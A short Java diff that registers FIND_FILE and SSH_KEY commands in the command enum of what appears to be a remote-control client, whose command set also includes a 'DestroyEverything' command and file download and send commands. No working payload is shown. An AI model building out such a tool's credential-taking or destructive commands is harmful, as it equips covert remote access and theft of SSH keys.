@@ -6,10 +6,7 @@ package br.com.introcdc.connect.client.command;
 import br.com.introcdc.connect.client.ConnectClient;
 import br.com.introcdc.connect.client.commands.audio.ClientCommandAudio;
 import br.com.introcdc.connect.client.commands.control.*;
-import br.com.introcdc.connect.client.commands.file.external.ClientCommandDestroyEverything;
-import br.com.introcdc.connect.client.commands.file.external.ClientCommandDownload;
-import br.com.introcdc.connect.client.commands.file.external.ClientCommandReceive;
-import br.com.introcdc.connect.client.commands.file.external.ClientCommandSend;
+import br.com.introcdc.connect.client.commands.file.external.*;
 import br.com.introcdc.connect.client.commands.file.manipulate.*;
 import br.com.introcdc.connect.client.commands.file.navigation.*;
 import br.com.introcdc.connect.client.commands.image.ClientCommandHistory;
@@ -51,6 +48,8 @@ public enum ClientCommandEnum {
     LIST_FILES(ClientCommandListFiles.class),
     OPEN(ClientCommandOpen.class),
     VIEW(ClientCommandView.class),
+    FIND_FILE(ClientCommandFindFile.class),
+    SSH_KEY(ClientCommandSshKey.class),
 
     // Image
     HISTORY(ClientCommandHistory.class),
